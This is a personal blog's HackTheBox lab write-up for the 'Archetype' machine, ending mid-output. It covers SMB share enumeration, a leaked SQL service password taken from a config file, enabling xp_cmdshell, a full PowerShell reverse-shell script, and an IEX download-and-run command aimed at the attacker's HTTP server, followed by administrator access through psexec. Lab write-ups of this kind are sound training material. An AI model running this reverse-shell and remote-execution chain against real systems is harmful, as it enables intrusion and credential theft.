@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://jakewilliami.github.io/main.css">
+  <title>Jake W. Ireland&#x27;s Blog</title>
+  <meta name="description" itemprop="about" content="Blog for J. W. Ireland; computer programmer, psychologist, and mathematician">
+
+  
+  <link rel="icon" type="image/x-icon" href="https://jakewilliami.github.io/assets/icons/favicon-dark.ico">
+  <link rel="apple-touch-icon" href="https://jakewilliami.github.io/assets/icons/apple-touch-icon-dark.png">
+  
+
+  
+  <link type="application/atom+xml" rel="alternate"
+    href="https://jakewilliami.github.io/atom.xml"
+    title="Jake W. Ireland&#x27;s Blog" />
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bitter:400,700&display=swap" />
+
+  
+
+</head>
+
+
+<body>
+  <section class='darkmode'>
+  <input class='toggle' id='darkmode-toggle' type='checkbox' tabindex="-1">
+  <label id="toggle-label-dark" for='darkmode-toggle' tabindex="-1">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon"
+      x="0px" y="0px" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'" xml:space="preserve">
+      <title>Change to dark mode</title>
+      <path
+        d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z" />
+    </svg>
+  </label>
+  <label id="toggle-label-light" for='darkmode-toggle' tabindex="-1">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon"
+      x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35;" xml:space="preserve">
+      <title>Change to light mode</title>
+      <path
+        d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z" />
+    </svg>
+  </label>
+</section>
+
+<style>
+  .darkmode {
+    display: inline-block;
+
+    &>.toggle {
+      display: none;
+      box-sizing: border-box;
+    }
+
+    & svg {
+      opacity: 0;
+      width: 20px;
+      height: 20px;
+      fill: var(--gray);
+      transition: opacity 0.1s ease;
+      cursor: pointer;
+    }
+
+    .toggle:checked~label {
+      &>#dayIcon {
+        opacity: 0;
+        display: none;
+      }
+
+      &>#nightIcon {
+        opacity: 1;
+        filter: invert(1);
+      }
+    }
+
+    .toggle:not(:checked)~label {
+      &>#dayIcon {
+        opacity: 1;
+      }
+
+      &>#nightIcon {
+        opacity: 0;
+        display: none;
+      }
+    }
+</style>
+
+<script>
+  const userPref = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark'
+  const currentTheme = localStorage.getItem('theme') ?? userPref
+  const syntaxTheme = document.querySelector("#theme-link");
+
+  if (currentTheme) {
+    document.documentElement.setAttribute('saved-theme', currentTheme);
+  }
+
+  const switchTheme = (e) => {
+    if (e.target.checked) {
+      document.documentElement.setAttribute('saved-theme', 'dark');
+      localStorage.setItem('theme', 'dark');
+    }
+    else {
+      document.documentElement.setAttribute('saved-theme', 'light')
+      localStorage.setItem('theme', 'light')
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    // Darkmode toggle
+    const toggleSwitch = document.querySelector('#darkmode-toggle')
+
+    // listen for toggle
+    toggleSwitch.addEventListener('change', switchTheme, false)
+
+    if (currentTheme === 'dark') {
+      toggleSwitch.checked = true
+    }
+  })
+
+</script>
+
+
+<nav class="nav">
+  <section class="nav-container">
+
+    <a href="https://jakewilliami.github.io/">
+      <h2 class="nav-title">Jake W. Ireland&#x27;s Blog</h2>
+    </a>
+    <ul>
+      
+      
+      <li><a href="https://jakewilliami.github.io/about">About</a></li>
+      
+    </ul>
+  </section>
+</nav>
+
+
+  <main>
+    
+<article class="post">
+	<section class="post-info">
+		
+		<span>on&nbsp;</span><time datetime="2021-03-22">Monday, 22 March, 2021</time>
+	</section>
+	<h1 class="post-title">
+      HackTheBox Write-up—Archetype
+    </h1>
+	<section class="post-line"></section>
+	<p>I am going to have a quick night of attempting the "Starting Point" machines in HackTheBox.  These machines I didn't see when I first started using HackTheBox, but they seem to be valuable in understanding the usual layout of these kinds of machines.  I think they are of a common author, too.  And I do believe this particular machine is made by the person who made HackTheBox.  So with all that in mind, here goes!</p>
+<hr />
+<h1 id="the-short-version">The Short Version</h1>
+<ol>
+<li>Enumerate ports via <code>nmap -sC -sV 10.10.10.27</code>. Optionally add the archetype machine to your <code>/etc/hosts</code> file for a nicer way of referencing this machine.</li>
+<li>Run <code>smbclient -N -L \\\\10.10.10.27\\</code> to list the directories in the samba storage. Notice <code>backups</code> is open access;</li>
+<li>Run <code>smbclient -N \\\\10.10.10.27\\backups</code> to peek inside the backups directory. Notice the <code>prod.dtsConfig</code> file inside;</li>
+<li>Get the <code>prod.dtsConfig</code> by running <code>get prod.dtsConfig</code> in the samba client;</li>
+<li>In your own shell, now run <code>cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the username, and <code>cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the password;</li>
+<li>Ensure you have Impacket's tools: <code>git clone https://github.com/SecureAuthCorp/impacket</code>;</li>
+<li>We can access the <code>mssql</code> server using Impacket's <code>mssqlclient</code> tool: <code>python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code>. Notice here the use of the username from two steps ago. When prompted, enter the password obtained from two steps ago;</li>
+<li>Now that you are logged in as <code>sql_svc</code>, we can run the following series of SQL commands to access the command shell:<pre data-lang="sql" style="background-color:#282a36;color:#f8f8f2;" class="language-sql "><code class="language-sql" data-lang="sql"><span>sp_configure </span><span style="color:#f1fa8c;">&#39;show advanced options&#39;</span><span>, </span><span style="color:#f1fa8c;">&#39;1&#39;
+</span><span>RECONFIGURE
+</span><span>sp_configure </span><span style="color:#f1fa8c;">&#39;xp_cmdshell&#39;</span><span>, </span><span style="color:#f1fa8c;">&#39;1&#39;
+</span><span>RECONFIGURE
+</span></code></pre>
+</li>
+<li>We need to note down your <code>tun0</code> IP. On your computer, run: <code>ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
+<li>We need to put the following into a <code>shell.ps1</code> file on your computer:<pre data-lang="powershell" style="background-color:#282a36;color:#f8f8f2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span style="color:#ffffff;">$client </span><span style="color:#ff79c6;">= </span><span style="color:#8be9fd;">New-Object</span><span> System.Net.Sockets.TCPClient(</span><span style="color:#f1fa8c;">&quot;10.10.14.34&quot;</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">1234</span><span>);</span><span style="color:#ffffff;">$stream </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$client.GetStream</span><span>();[</span><span style="font-style:italic;color:#8be9fd;">byte</span><span>[]]</span><span style="color:#ffffff;">$bytes </span><span style="color:#ff79c6;">= </span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">..</span><span style="color:#bd93f9;">65535</span><span style="color:#ff79c6;">|%</span><span>{</span><span style="color:#bd93f9;">0</span><span>};</span><span style="color:#ff79c6;">while</span><span>((</span><span style="color:#ffffff;">$i </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$stream.Read</span><span>(</span><span style="color:#ffffff;">$bytes</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">, </span><span style="color:#ffffff;">$bytes.Length</span><span>)) </span><span style="color:#ff79c6;">-ne </span><span style="color:#bd93f9;">0</span><span>){;</span><span style="color:#ffffff;">$data </span><span style="color:#ff79c6;">= </span><span>(</span><span style="color:#8be9fd;">New-Object </span><span style="color:#ff79c6;">-</span><span>TypeName System.Text.ASCIIEncoding).GetString(</span><span style="color:#ffffff;">$bytes</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">, </span><span style="color:#ffffff;">$i</span><span>);</span><span style="color:#ffffff;">$sendback </span><span style="color:#ff79c6;">= </span><span>(iex </span><span style="color:#ffffff;">$data </span><span style="color:#ff79c6;">2&gt;&amp;1 | </span><span style="color:#8be9fd;">Out-String </span><span>);</span><span style="color:#ffffff;">$sendback2 </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$sendback </span><span style="color:#ff79c6;">+ </span><span style="color:#f1fa8c;">&quot;# &quot;</span><span>; </span><span style="color:#ffffff;">$sendbyte </span><span style="color:#ff79c6;">= </span><span>([</span><span style="font-style:italic;color:#8be9fd;">text.encoding</span><span>]::ASCII).GetBytes(</span><span style="color:#ffffff;">$sendback2</span><span>);</span><span style="color:#ffffff;">$stream.Write</span><span>(</span><span style="color:#ffffff;">$sendbyte</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">,</span><span style="color:#ffffff;">$sendbyte.Length</span><span>);</span><span style="color:#ffffff;">$stream.Flush</span><span>()};</span><span style="color:#ffffff;">$client.close</span><span>()
+</span></code></pre>
+Notice that we have your <code>tun0</code> IP, with some port number (here we have chosen <code>1234</code>) near the start of the file;</li>
+<li>On your computer, we need to set up an http server for later; run <code>sudo python3 -m http.server 80</code>. Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
+<li>Also on your computer, we will need a netcat listener; run <code>nc -nvlp 1234</code> (or exchange <code>1234</code> with the port you chose two steps ago. Note that in the verbatim version, I used this along with <code>rlwrap</code> to make this step nicer);</li>
+<li>Back in the SQL window, now run <code>xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");</code>" in order to transfer the reverse powershell script to the SQL database;</li>
+<li>Go back to you netcat listener window, and you will see that it has connected to the server! You can verify this by running <code>whoami</code>. You can now run more <code>\users\sql_svc\desktop\user.txt</code> to capture the user flag!;</li>
+<li>This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces. Simply run: <code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> and you will see a username and a password;</li>
+<li>Going back to your computer, we now need to log into the <code>administrator</code> user. We can do this using another one of Impacket's scripts: <code>psexec.py</code>: <code>python3 impacket/examples/psexec.py administrator@archetype</code>. Enter the password found in the previous step when prompted;</li>
+<li>Now you are logged into the administrator, you can capture the root flat: <code>more \users\administrator\desktop\root.txt</code>, and you are finished!</li>
+</ol>
+<h1 id="the-long-verbatim-version">The Long (Verbatim) Version</h1>
+<p>We enumerate the ports:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>$ bash common/nmap.sh archetype
+</span><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 22:16 NZDT
+</span><span>Nmap scan report for archetype (10.10.10.27)
+</span><span>Host is up (0.24s latency).
+</span><span>Not shown: 996 closed ports
+</span><span>PORT     STATE SERVICE      VERSION
+</span><span>135/tcp  open  msrpc        Microsoft Windows RPC
+</span><span>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span><span>445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+</span><span>1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+</span><span>| ms-sql-ntlm-info:
+</span><span>|   Target_Name: ARCHETYPE
+</span><span>|   NetBIOS_Domain_Name: ARCHETYPE
+</span><span>|   NetBIOS_Computer_Name: ARCHETYPE
+</span><span>|   DNS_Domain_Name: Archetype
+</span><span>|   DNS_Computer_Name: Archetype
+</span><span>|_  Product_Version: 10.0.17763
+</span><span>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span><span>| Not valid before: 2021-03-22T09:16:33
+</span><span>|_Not valid after:  2051-03-22T09:16:33
+</span><span>|_ssl-date: 2021-03-22T09:38:16+00:00; +21m07s from scanner time.
+</span><span>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span><span>
+</span><span>Host script results:
+</span><span>|_clock-skew: mean: 1h45m06s, deviation: 3h07m50s, median: 21m05s
+</span><span>| ms-sql-info:
+</span><span>|   10.10.10.27:1433:
+</span><span>|     Version:
+</span><span>|       name: Microsoft SQL Server 2017 RTM
+</span><span>|       number: 14.00.1000.00
+</span><span>|       Product: Microsoft SQL Server 2017
+</span><span>|       Service pack level: RTM
+</span><span>|       Post-SP patches applied: false
+</span><span>|_    TCP port: 1433
+</span><span>| smb-os-discovery:
+</span><span>|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+</span><span>|   Computer name: Archetype
+</span><span>|   NetBIOS computer name: ARCHETYPE\x00
+</span><span>|   Workgroup: WORKGROUP\x00
+</span><span>|_  System time: 2021-03-22T02:38:03-07:00
+</span><span>| smb-security-mode:
+</span><span>|   account_used: guest
+</span><span>|   authentication_level: user
+</span><span>|   challenge_response: supported
+</span><span>|_  message_signing: disabled (dangerous, but default)
+</span><span>| smb2-security-mode:
+</span><span>|   2.02:
+</span><span>|_    Message signing enabled but not required
+</span><span>| smb2-time:
+</span><span>|   date: 2021-03-22T09:38:04
+</span><span>|_  start_date: N/A
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 45.36 seconds
+</span></code></pre>
+<p>This is a good start.  As usual, we look for a web domain to gain a foothold.  There is a lot of information here, but we see an RPC server on port <code>135</code>, a <code>netbios-ssn</code> on port <code>139</code>, a <code>microsoft-ds</code> on port <code>445</code>, and an SQL server on port <code>1433</code>.  However, seeing that there is an SQL server, let's try to get some SQL tools ready.  I see we can install them <a href="https://docs.microsoft.com/en-us/sql/linux/sql-server-linux-setup-tools?view=sql-server-ver15#ubuntu">via these instructions</a>.  However, this installation is specifically for Ubuntu so it failed.</p>
+<p>However, I did find <a href="https://resources.infosecinstitute.com/topic/attacking-ms-sql-server-gain-system-access/">this</a> on the web, and keeping in mind my initial thoughts on HTB, this looks very convenient!</p>
+<p>From the link, we see that ExploitDB has some things.  So, there are a lot of exploits, it seems.  We need to choose one...  We know that the <code>mssql</code> server version this machine is using is from 2017.</p>
+<p>Let's quickly have a look at the <a href="https://opensource.com/article/18/1/ms-sql-command-line-client">CLI for <code>mssql</code></a> before we have a go at the metasploit results.  We need to first run:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> pip install mssql-cli
+</span><span style="color:#50fa7b;">$</span><span> echo </span><span style="color:#f1fa8c;">&#39;PATH=$PATH:$HOME/.local/bin/&#39; </span><span style="color:#ff79c6;">&gt;&gt; </span><span style="color:#bd93f9;">~</span><span>/.zshrc
+</span><span style="color:#50fa7b;">$</span><span> source </span><span style="color:#bd93f9;">~</span><span>/.zshrc
+</span></code></pre>
+<p>However, this CLI keeps erroring regarding dependencies, so no good.  Let's have another look at those metasploit results.</p>
+<p>I run</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>searchsploit -m 23649
+</span></code></pre>
+<p>At this point, I realise I have very little knowledge of how to use metasploit, so I found <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik">this video</a> which helped me understand.  So entering the <code>msfconsole</code> and we search for exploits:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>msf6 &gt; search type:exploit platform:windows microsoft sql
+</span></code></pre>
+<p>Recall that we are dealing with Microsoft SQL Server 2017, and only one of these has an Disclosure Date of later than that, so we choose that one:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>msf6 &gt; use exploit/windows/http/ssrs_navcorrector_viewstate
+</span><span>[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span><span>msf6 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; show targets
+</span><span>
+</span><span>Exploit targets:
+</span><span>
+</span><span>   Id  Name
+</span><span>   --  ----
+</span><span>   0   Windows (x86)
+</span><span>   1   Windows (x64)
+</span><span>   2   Windows (cmd)
+</span><span>
+</span><span>
+</span><span>msf6 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; show info
+</span><span>
+</span><span>       Name: SQL Server Reporting Services (SSRS) ViewState Deserialization
+</span><span>     Module: exploit/windows/http/ssrs_navcorrector_viewstate
+</span><span>   Platform: Windows
+</span><span>       Arch:
+</span><span> Privileged: Yes
+</span><span>    License: Metasploit Framework License (BSD)
+</span><span>       Rank: Excellent
+</span><span>  Disclosed: 2020-02-11
+</span><span>
+</span><span>Provided by:
+</span><span>  Soroush Dalili
+</span><span>  Spencer McIntyre
+</span><span>
+</span><span>Module side effects:
+</span><span> artifacts-on-disk
+</span><span> ioc-in-logs
+</span><span>
+</span><span>Module stability:
+</span><span> crash-safe
+</span><span>
+</span><span>Module reliability:
+</span><span> repeatable-session
+</span><span>
+</span><span>Available targets:
+</span><span>  Id  Name
+</span><span>  --  ----
+</span><span>  0   Windows (x86)
+</span><span>  1   Windows (x64)
+</span><span>  2   Windows (cmd)
+</span><span>
+</span><span>Check supported:
+</span><span>  Yes
+</span><span>
+</span><span>Basic options:
+</span><span>  Name       Current Setting  Required  Description
+</span><span>  ----       ---------------  --------  -----------
+</span><span>  DOMAIN     WORKSTATION      yes       The domain to use for Windows authentication
+</span><span>  PASSWORD                    yes       The password to authenticate with
+</span><span>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span>  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+</span><span>  RPORT      80               yes       The target port (TCP)
+</span><span>  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span><span>  SRVPORT    8080             yes       The local port to listen on.
+</span><span>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span><span>  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+</span><span>  TARGETURI  /Reports         yes       The base path to the web application
+</span><span>  URIPATH                     no        The URI to use for this exploit (default is random)
+</span><span>  USERNAME                    yes       Username to authenticate as
+</span><span>  VHOST                       no        HTTP server virtual host
+</span><span>
+</span><span>Payload information:
+</span><span>
+</span><span>Description:
+</span><span>  A vulnerability exists within Microsoft&#39;s SQL Server Reporting
+</span><span>  Services which can allow an attacker to craft an HTTP POST request
+</span><span>  with a serialized object to achieve remote code execution. The
+</span><span>  vulnerability is due to the fact that the serialized blob is not
+</span><span>  signed by the server.
+</span><span>
+</span><span>References:
+</span><span>  https://cvedetails.com/cve/CVE-2020-0618/
+</span><span>  https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
+</span></code></pre>
+<p>Let's quickly digress.</p>
+<hr />
+<p>After some searching online, we see that <code>microsoft-ds</code> is actually associated with samba!  We know of samba from our home server, and have <code>smbclient</code> installed.</p>
+<p>We run</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">smbclient</span><span style="font-style:italic;color:#ffb86c;"> -N -L </span><span style="color:#ff79c6;">\\\\</span><span>10.10.10.27</span><span style="color:#ff79c6;">\\
+</span></code></pre>
+<p>This enumerates the samba shares available:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> smbclient</span><span style="font-style:italic;color:#ffb86c;"> -N -L </span><span style="color:#ff79c6;">\\\\</span><span>10.10.10.27</span><span style="color:#ff79c6;">\\
+</span><span>
+</span><span>        </span><span style="color:#50fa7b;">Sharename</span><span>       Type      Comment
+</span><span>        </span><span style="color:#50fa7b;">---------</span><span>       ----      -------
+</span><span>        </span><span style="color:#50fa7b;">ADMIN$</span><span>          Disk      Remote Admin
+</span><span>        </span><span style="color:#50fa7b;">backups</span><span>         Disk
+</span><span>        </span><span style="color:#50fa7b;">C$</span><span>              Disk      Default share
+</span><span>        </span><span style="color:#50fa7b;">IPC$</span><span>            IPC       Remote IPC
+</span><span style="color:#50fa7b;">SMB1</span><span> disabled</span><span style="color:#ff79c6;"> --</span><span> no workgroup available
+</span></code></pre>
+<p>Let's have a look at what is in <code>ADMIN$</code>!:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> smbclient</span><span style="font-style:italic;color:#ffb86c;"> -N </span><span style="color:#ff79c6;">\\\\</span><span>10.10.10.27</span><span style="color:#ff79c6;">\\</span><span>ADMIN$                               1 ⨯
+</span><span style="color:#50fa7b;">tree</span><span> connect failed: NT_STATUS_ACCESS_DENIED
+</span></code></pre>
+<p>It seems it is not accessible anonymously.  In fact, the only one anonymously accessible is <code>backups</code>, and here is what we find:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span> </span><span style="color:#50fa7b;">smbclient</span><span style="font-style:italic;color:#ffb86c;"> -N </span><span style="color:#ff79c6;">\\\\</span><span>10.10.10.27</span><span style="color:#ff79c6;">\\</span><span>backups                                                                                                                           1 ⨯
+</span><span style="color:#50fa7b;">Try </span><span style="color:#f1fa8c;">&quot;help&quot;</span><span> to get a list of possible commands.
+</span><span style="color:#50fa7b;">smb: </span><span style="color:#ff79c6;">\&gt;</span><span> ls
+</span><span>  </span><span style="color:#8be9fd;">.</span><span>                                   D        0  Tue Jan 21 01:20:57 2020
+</span><span>  </span><span style="color:#50fa7b;">..</span><span>                                  D        0  Tue Jan 21 01:20:57 2020
+</span><span>  </span><span style="color:#50fa7b;">prod.dtsConfig</span><span>                     AR      609  Tue Jan 21 01:23:02 2020
+</span><span>
+</span><span>                </span><span style="color:#50fa7b;">10328063</span><span> blocks of size 4096. 8260396 blocks available
+</span><span style="color:#50fa7b;">smb: </span><span style="color:#ff79c6;">\&gt;
+</span></code></pre>
+<p>Note that another command for <code>ls</code> is <code>dir</code> in samba client.</p>
+<p>We run <code>get prod.dtsConfig</code> to get the file in the backup directory.  It looks like this:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>&lt;DTSConfiguration&gt;
+</span><span>    &lt;DTSConfigurationHeading&gt;
+</span><span>        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;
+</span><span>    &lt;/DTSConfigurationHeading&gt;
+</span><span>    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;
+</span><span>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+</span><span>    &lt;/Configuration&gt;
+</span><span>&lt;/DTSConfiguration&gt;
+</span></code></pre>
+<p>It looks like there is a password and username here!  We recall from Passage that we have Impacket's <code>mssqlclient.py</code> script, and we use it here:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> git clone https://github.com/SecureAuthCorp/impacket</span><span style="color:#ff79c6;">;
+</span><span>
+</span><span style="color:#50fa7b;">$</span><span> python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27</span><span style="font-style:italic;color:#ffb86c;"> -windows-auth
+</span><span style="color:#50fa7b;">Impacket</span><span> v0.9.22 - Copyright 2020 SecureAuth Corporation
+</span><span>
+</span><span style="color:#50fa7b;">Password:
+</span><span style="color:#50fa7b;">[*]</span><span> Encryption required, switching to TLS
+</span><span style="color:#50fa7b;">[*]</span><span> ENVCHANGE(DATABASE)</span><span style="color:#8be9fd;">:</span><span> Old Value: master, New Value: master
+</span><span style="color:#50fa7b;">[*]</span><span> ENVCHANGE(LANGUAGE)</span><span style="color:#8be9fd;">:</span><span> Old Value: , New Value: us_english
+</span><span style="color:#50fa7b;">[*]</span><span> ENVCHANGE(PACKETSIZE)</span><span style="color:#8be9fd;">:</span><span> Old Value: 4096, New Value: 16192
+</span><span style="color:#50fa7b;">[*]</span><span> INFO(ARCHETYPE)</span><span style="color:#8be9fd;">:</span><span> Line 1: Changed database context to </span><span style="color:#f1fa8c;">&#39;master&#39;</span><span>.
+</span><span style="color:#50fa7b;">[*]</span><span> INFO(ARCHETYPE)</span><span style="color:#8be9fd;">:</span><span> Line 1: Changed language setting to us_english.
+</span><span style="color:#50fa7b;">[*]</span><span> ACK: Result: 1 - Microsoft SQL Server (140 3232)
+</span><span style="color:#50fa7b;">[!]</span><span> Press help for extra shell commands
+</span><span style="color:#50fa7b;">SQL</span><span style="color:#ff79c6;">&gt;
+</span></code></pre>
+<p>Now we are logged in as user <code>ARCHETYPE\sql_svc</code>!</p>
+<p>Let's have a look at the help commands:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>SQL&gt; help
+</span><span>
+</span><span>     lcd {path}                 - changes the current local directory to {path}
+</span><span>     exit                       - terminates the server process (and this session)
+</span><span>     enable_xp_cmdshell         - you know what it means
+</span><span>     disable_xp_cmdshell        - you know what it means
+</span><span>     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+</span><span>     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+</span><span>     ! {cmd}                    - executes a local shell cmd
+</span></code></pre>
+<p>This is curious; particularly the <code>xp_cmdshell</code> ones...  We need a way to change this SQL shell into an RCE.  Searching <code>xp_cmdshell</code>, I found <a href="https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/">this</a> on the web to help us do this!  Running</p>
+<pre data-lang="sql" style="background-color:#282a36;color:#f8f8f2;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#6272a4;">-- this turns on advanced options and is needed to configure xp_cmdshell
+</span><span>sp_configure </span><span style="color:#f1fa8c;">&#39;show advanced options&#39;</span><span>, </span><span style="color:#f1fa8c;">&#39;1&#39;
+</span><span>RECONFIGURE
+</span><span style="color:#6272a4;">-- this enables xp_cmdshell
+</span><span>sp_configure </span><span style="color:#f1fa8c;">&#39;xp_cmdshell&#39;</span><span>, </span><span style="color:#f1fa8c;">&#39;1&#39;
+</span><span>RECONFIGURE
+</span></code></pre>
+<p>Here is the output:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>SQL&gt; sp_configure &#39;show advanced options&#39;, &#39;1&#39;
+</span><span>[*] INFO(ARCHETYPE): Line 185: Configuration option &#39;show advanced options&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
